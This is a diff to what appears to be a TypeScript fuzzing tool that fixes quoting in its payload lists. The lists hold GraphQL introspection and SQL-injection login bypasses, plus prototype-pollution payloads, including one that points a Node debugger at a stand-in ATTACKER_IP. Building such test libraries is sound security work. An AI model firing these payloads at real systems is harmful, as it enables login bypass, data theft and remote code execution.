@@ -167,7 +167,7 @@ const FUZZ_SETS: Record<string, string[]> = {
     '{"query":"{ __schema { types { name } } }"}',
     '{"query":"{ __type(name:\\"User\\") { fields { name } } }"}',
     '{"query":"{ users { id email password } }"}',
-    `{"query":"mutation{login(user:\\"admin\\"password:\\"' OR '1'='1\\"){token}}"}`,
+    '{"query":"mutation{login(user:\\"admin\\"password:\\"\\' OR \'1\'=\'1\\"){token}}"}',
     '{"query":"{ user(id:\\"1 OR 1=1\\") { secret } }"}',
     '{"query":"query{__typename @skip(if:false)}"}',
     'query={user(id:"\\x27 OR \\x271\\x27=\\x271"){ email }}',
@@ -501,7 +501,7 @@ const PAYLOAD_LIBRARY = [
     '{"__proto__":{"NODE_OPTIONS":"--require /proc/self/fd/0"}}',
     "__proto__[outputFunctionName]=_x3Bconsole.log(1)_x3B//",
     "?__proto__[evilKey]=evilVal",
-    '{"__proto__":{"toString":"function(){return \\'pwned\\'}"}}',
+    `{"__proto__":{"toString":"function(){return 'pwned'}"}}`,
     '{"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=ATTACKER_IP:9229"}}',
   ]},
   { cat:"DESERIALIZATION", col:"text-orange-500", p:[
